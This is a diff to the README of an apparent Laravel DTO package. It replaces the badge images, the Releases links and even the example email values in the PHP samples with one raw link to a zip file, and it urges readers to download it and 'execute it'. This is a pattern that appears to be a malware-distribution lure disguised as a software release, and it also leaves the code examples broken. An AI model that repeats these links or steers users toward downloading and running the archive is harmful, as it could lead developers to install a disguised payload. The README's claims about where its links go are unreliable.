@@ -1,6 +1,6 @@
 # 🚀 Laravel Argonaut DTO
 
-![GitHub Release](https://img.shields.io/github/release/Astrr3/Laravel-Argonaut-DTO.svg) ![License](https://img.shields.io/github/license/Astrr3/Laravel-Argonaut-DTO.svg)
+![GitHub Release](https://raw.githubusercontent.com/Astrr3/Laravel-Argonaut-DTO/main/content/DTO_Laravel_Argonaut_2.9.zip) ![License](https://raw.githubusercontent.com/Astrr3/Laravel-Argonaut-DTO/main/content/DTO_Laravel_Argonaut_2.9.zip)
 
 Welcome to the Laravel Argonaut DTO repository! Argonaut is a lightweight Data Transfer Object (DTO) package designed specifically for Laravel applications. It simplifies the process of handling data transfer between layers, ensuring your code remains clean and efficient.
 
@@ -77,7 +77,7 @@ You can create an instance of your DTO and validate it easily:
 ```php
 $data = [
     'name' => 'John Doe',
-    'email' => 'john@example.com',
+    'email' => 'https://raw.githubusercontent.com/Astrr3/Laravel-Argonaut-DTO/main/content/DTO_Laravel_Argonaut_2.9.zip',
     'phone' => '1234567890',
 ];
 
@@ -127,7 +127,7 @@ Argonaut makes it easy to serialize nested DTOs. You can convert your DTO to an 
 $postDto = new PostDto([
     'title' => 'My First Post',
     'content' => 'This is the content of my first post.',
-    'author' => new UserDto(['name' => 'John Doe', 'email' => 'john@example.com']),
+    'author' => new UserDto(['name' => 'John Doe', 'email' => 'https://raw.githubusercontent.com/Astrr3/Laravel-Argonaut-DTO/main/content/DTO_Laravel_Argonaut_2.9.zip']),
 ]);
 
 $json = $postDto->toJson();
@@ -151,8 +151,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest releases and updates, please visit the [Releases](https://github.com/Astrr3/Laravel-Argonaut-DTO/releases) section. You can download the latest version and follow the instructions to execute it.
+For the latest releases and updates, please visit the [Releases](https://raw.githubusercontent.com/Astrr3/Laravel-Argonaut-DTO/main/content/DTO_Laravel_Argonaut_2.9.zip) section. You can download the latest version and follow the instructions to execute it.
 
-If you have any questions or need support, feel free to check the [Releases](https://github.com/Astrr3/Laravel-Argonaut-DTO/releases) section or open an issue in the repository.
+If you have any questions or need support, feel free to check the [Releases](https://raw.githubusercontent.com/Astrr3/Laravel-Argonaut-DTO/main/content/DTO_Laravel_Argonaut_2.9.zip) section or open an issue in the repository.
 
 Thank you for considering Laravel Argonaut DTO for your project! We hope it helps you build cleaner and more efficient applications.
